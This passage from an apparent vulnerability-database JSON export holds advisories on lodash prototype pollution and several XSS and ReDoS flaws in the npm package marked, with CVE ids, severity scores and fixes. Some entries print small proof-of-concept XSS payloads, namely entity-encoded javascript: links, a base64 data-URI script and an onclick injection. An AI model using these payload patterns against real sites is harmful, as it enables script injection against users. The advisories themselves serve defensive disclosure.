practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `lodash` to version 4.17.5 or higher.\n## References\n- [GitHub Commit](https://github.com/lodash/lodash/commit/d8e069cc3410082e44eb18fcf8e7f3d08ebe1d4a)\n- [GitHub PR](https://github.com/lodash/lodash/pull/4337)\n- [HackerOne Report](https://hackerone.com/reports/310443)\n- [NPM Security Advisory](https://www.npmjs.com/advisories/1067)\n- [NPM Security Advisory](https://www.npmjs.com/advisories/1069)\n- [NPM Security Advisory](https://www.npmjs.com/advisories/1070)\n",
        "created_at": "2018-02-12T22:28:27Z",
        "updated_at": "2024-07-09T12:50:20Z",
        "problems": [
          {
            "id": "CVE-2018-3721",
            "source": "CVE"
          },
          {
            "id": "CWE-1321",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 4.17.5 to fix this vulnerability",
                "details": {
                  "upgrade_package": "4.17.5"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<4.17.5"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 6.3,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L/E:P"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2018-01-30T22:28:27Z",
            "exploit": "Proof of Concept",
            "publication_time": "2018-02-14T13:22:50Z",
            "references": [
              {
                "url": "https://github.com/lodash/lodash/commit/d8e069cc3410082e44eb18fcf8e7f3d08ebe1d4a",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/lodash/lodash/pull/4337",
                "title": "GitHub PR"
              },
              {
                "url": "https://hackerone.com/reports/310443",
                "title": "HackerOne Report"
              },
              {
                "url": "https://www.npmjs.com/advisories/1067",
                "title": "NPM Security Advisory"
              },
              {
                "url": "https://www.npmjs.com/advisories/1069",
                "title": "NPM Security Advisory"
              },
              {
                "url": "https://www.npmjs.com/advisories/1070",
                "title": "NPM Security Advisory"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "npm:marked:20150520",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Cross-site Scripting (XSS)",
        "description": "## Overview\n[marked](https://marked.js.org/) is a low-level compiler for parsing markdown without caching or blocking for long periods of time.\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS). An attacker could bypass its output sanitization (`sanitize: true`) protection. Using the [HTML Coded Character Set](https://www.w3.org/MarkUp/html-spec/html-spec_13.html#SEC13), attackers can inject `javascript:` code snippets into the output. For example, the following input `javascript&#x58document;alert&#40;1&#41;`  will result in `alert(1)` being executed when the user clicks on the link.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `marked` to version 0.3.6 or higher.\n## References\n- [GitHub Commit](https://github.com/chjj/marked/pull/592/commits/2cff85979be8e7a026a9aca35542c470cf5da523)\n- [GitHub PR](https://github.com/chjj/marked/pull/592)\n",
        "created_at": "2016-04-20T14:45:19Z",
        "updated_at": "2024-03-11T09:46:37Z",
        "problems": [
          {
            "id": "CVE-2016-10531",
            "source": "CVE"
          },
          {
            "id": "CWE-79",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 0.3.6 to fix this vulnerability",
                "details": {
                  "upgrade_package": "0.3.6"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": ">=0.3.1 <0.3.6"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 8.8,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2015-05-20T16:45:00Z",
            "exploit": "Not Defined",
            "publication_time": "2016-04-20T14:45:19Z",
            "references": [
              {
                "url": "https://github.com/chjj/marked/pull/592/commits/2cff85979be8e7a026a9aca35542c470cf5da523",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/chjj/marked/pull/592",
                "title": "GitHub PR"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "npm:marked:20170112",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Cross-site Scripting (XSS)",
        "description": "## Overview\n[marked](https://marked.js.org/) is a low-level compiler for parsing markdown without caching or blocking for long periods of time.\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS). Data URIs enable embedding small files in line in HTML documents, provided in the URL itself.\r\nAttackers can craft malicious web pages containing either HTML or script code that utilizes the data URI scheme, allowing them to bypass access controls or steal sensitive information.\r\n\r\nAn example of data URI used to deliver javascript code. The data holds `<script>alert('XSS')</script>` tag in base64 encoded format.\r\n```html\r\n[xss link](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\r\n```\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `marked` to version 0.3.7 or higher.\n## References\n- [GitHub Commit](https://github.com/chjj/marked/commit/cd2f6f5b7091154c5526e79b5f3bfb4d15995a51)\n",
        "created_at": "2017-01-12T00:00:00Z",
        "updated_at": "2024-03-11T09:46:36Z",
        "problems": [
          {
            "id": "CVE-2017-1000427",
            "source": "CVE"
          },
          {
            "id": "CWE-79",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 0.3.7 to fix this vulnerability",
                "details": {
                  "upgrade_package": "0.3.7"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<0.3.7"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 7.5,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2017-01-12T00:00:00Z",
            "exploit": "Not Defined",
            "publication_time": "2017-01-30T18:00:00Z",
            "references": [
              {
                "url": "https://github.com/chjj/marked/commit/cd2f6f5b7091154c5526e79b5f3bfb4d15995a51",
                "title": "GitHub Commit"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "npm:marked:20170815",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Cross-site Scripting (XSS)",
        "description": "## Overview\n[marked](https://marked.js.org/) is a low-level compiler for parsing markdown without caching or blocking for long periods of time.\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS). Browsers support both lowercase and uppercase x in hexadecimal form of HTML character entity, but marked [unescaped only lowercase](https://github.com/chjj/marked/blob/v0.3.7/lib/marked.js#L1096-L1108).\r\n\r\nThis may allow an attacker to create a link with javascript code.\r\n\r\nFor example:\r\n```js\r\nvar marked = require('marked');\r\nmarked.setOptions({\r\n  renderer: new marked.Renderer(),\r\n  sanitize: true\r\n});\r\n\r\ntext = `\r\nlower[click me](javascript&#x3a;...)lower\r\nupper[click me](javascript&#X3a;...)upper\r\n`;\r\n\r\nconsole.log(marked(text));\r\n```\r\n\r\nwill render the following:\r\n\r\n```html\r\n<p>lowerlower\r\nupper<a href=\"javascript&#X3a;...\">click me</a>upper</p>\r\n\r\n```\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `marked` to version 0.3.9 or higher.\n## References\n- [GitHub Commit](https://github.com/markedjs/marked/pull/976/commits/6d1901ff71abb83aa32ca9a5ce47471382ea42a9)\n- [GitHub Issue](https://github.com/chjj/marked/issues/925)\n- [GitHub PR](https://github.com/chjj/marked/pull/958)\n",
        "created_at": "2017-12-04T00:00:00Z",
        "updated_at": "2024-03-06T13:59:01Z",
        "problems": [
          {
            "id": "CWE-79",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 0.3.9 to fix this vulnerability",
                "details": {
                  "upgrade_package": "0.3.9"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<0.3.9"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 7.5,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2017-08-15T00:00:00Z",
            "exploit": "Not Defined",
            "publication_time": "2017-12-25T15:00:00Z",
            "references": [
              {
                "url": "https://github.com/markedjs/marked/pull/976/commits/6d1901ff71abb83aa32ca9a5ce47471382ea42a9",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/chjj/marked/issues/925",
                "title": "GitHub Issue"
              },
              {
                "url": "https://github.com/chjj/marked/pull/958",
                "title": "GitHub PR"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "npm:marked:20170815-1",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Cross-site Scripting (XSS)",
        "description": "## Overview\n[marked](https://marked.js.org/) is a low-level compiler for parsing markdown without caching or blocking for long periods of time.\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS). When mangling is disabled via option `mangle`, marked doesn't escape target `href`. This may allow an attacker to inject arbitrary `html-event` into resulting a tag.\r\n\r\nFor example:\r\n```js\r\nvar marked = require('marked');\r\nmarked.setOptions({\r\n  renderer: new marked.Renderer(),\r\n  sanitize: true,\r\n  mangle: false\r\n});\r\n\r\ntext = `\r\n<bar\"onclick=\"alert('XSS')\"@foo>\r\n`;\r\n\r\nconsole.log(marked(text));\r\n```\r\n\r\nwill render:\r\n\r\n```html\r\n<p><a href=\"mailto:bar\"onclick=\"alert('XSS')\"@foo\">bar\"onclick=\"alert('XSS')\"@foo</a></p>\r\n```\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `marked` to version 0.3.9 or higher.\n## References\n- [GitHub Commit](https://github.com/markedjs/marked/pull/976/commits/cb72584c5d9d32ebfdbb99e35fb9b81af2b79686)\n- [GitHub Issue](https://github.com/chjj/marked/issues/926)\n- [GitHub PR](https://github.com/chjj/marked/pull/958)\n",
        "created_at": "2017-12-04T00:00:00Z",
        "updated_at": "2024-03-06T13:57:08Z",
        "problems": [
          {
            "id": "CWE-79",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 0.3.9 to fix this vulnerability",
                "details": {
                  "upgrade_package": "0.3.9"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<0.3.9"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 4.8,
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2017-08-15T00:00:00Z",
            "exploit": "Not Defined",
            "publication_time": "2017-12-25T15:00:00Z",
            "references": [
              {
                "url": "https://github.com/markedjs/marked/pull/976/commits/cb72584c5d9d32ebfdbb99e35fb9b81af2b79686",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/chjj/marked/issues/926",
                "title": "GitHub Issue"
              },
              {
                "url": "https://github.com/chjj/marked/pull/958",
                "title": "GitHub PR"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "npm:marked:20170907",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Regular Expression Denial of Service (ReDoS)",
        "description": "## Overview\n\n[marked](https://marked.js.org/) is a low-level compiler for parsing markdown without caching or blocking for long periods of time.\n\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS)\nwhen parsing the input markdown content (1,000 characters costs around 6 seconds matching time).\n\n## Details\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\r\n\r\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\r\n\r\nLet’s take the following regular expression as an example:\r\n```js\r\nregex = /A(B|C+)+D/\r\n```\r\n\r\nThis regular expression accomplishes the following:\r\n- `A` The string must start with the letter 'A'\r\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\r\n- `D` Finally, we ensure this section of the string ends with a 'D'\r\n\r\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\r\n\r\nIt most cases, it doesn't take very long for a regex engine to find a match:\r\n\r\n```bash\r\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\r\n0.04s user 0.01s system 95% cpu 0.052 total\r\n\r\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\r\n1.79s user 0.02s system 99% cpu 1.812 total\r\n```\r\n\r\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\r\n\r\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\r\n\r\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\r\n1. CCC\r\n2. CC+C\r\n3. C+CC\r\n4. C+C+C.\r\n\r\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\r\n\r\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\r\n\r\n| String | Number of C's | Number of steps |\r\n| -------|-------------:| -----:|\r\n| ACCCX | 3 | 38\r\n| ACCCCX | 4 | 71\r\n| ACCCCCX | 5 | 136\r\n| ACCCCCCCCCCCCCCX | 14 | 65,553\r\n\r\n\r\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\n\nUpgrade `marked` to version 0.3.9 or higher.\n\n\n## References\n\n- [GitHub Issue](https://github.com/chjj/marked/issues/937)\n\n- [GitHub PR](https://github.com/chjj/marked/pull/958)\n",
        "created_at": "2017-09-21T08:07:51Z",
        "updated_at": "2024-03-11T09:47:02Z",
        "problems": [
          {
            "id": "CVE-2017-16114",
            "source": "CVE"
          },
          {
            "id": "CWE-400",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 0.3.9 to fix this vulnerability",
                "details": {
                  "upgrade_package": "0.3.9"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<0.3.9"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 7.5,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2017-09-07T21:00:00Z",
            "exploit": "Not Defined",
            "publication_time": "2017-09-21T08:07:51Z",
            "references": [
              {
                "url": "https://github.com/chjj/marked/issues/937",
                "title": "GitHub Issue"
              },
              {
                "url": "https://github.com/chjj/marked/pull/958",
                "title": "GitHub PR"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "npm:marked:20180225",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Regular Expression Denial of Service (ReDoS)",
        "description": "## Overview\n[marked](https://marked.js.org/) is a low-level compiler for parsing markdown without caching or blocking for long periods of time.\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). This can cause an impact of about 10 seconds matching time for data 150 characters long.\r\n\r\n## Disclosure Timeline\r\n* Feb 21th, 2018 - Initial Disclosure to package owner\r\n* Feb 21th, 2018 - Initial Response from package owner\r\n* Feb 26th, 2018 - Fix issued\r\n* Feb 27th, 2018 - Vulnerability published\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `marked` to version 0.3.18 or higher.\n## References\n- [GitHub Commit](https://github.com/markedjs/marked/pull/1083/commits/b15e42b67cec9ded8505e9d68bb8741ad7a9590d)\n- [GitHub PR](https://github.com/markedjs/marked/pull/1083)\n",
        "created_at": "2018-02-27T15:06:27Z",
        "updated_at": "2024-03-06T14:03:19Z",
        "problems": [
          {
            "id": "CWE-185",
            "source": "CWE"
          },
          {
            "id": "CWE-400",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 0.3.18 to fix this vulnerability",
                "details": {
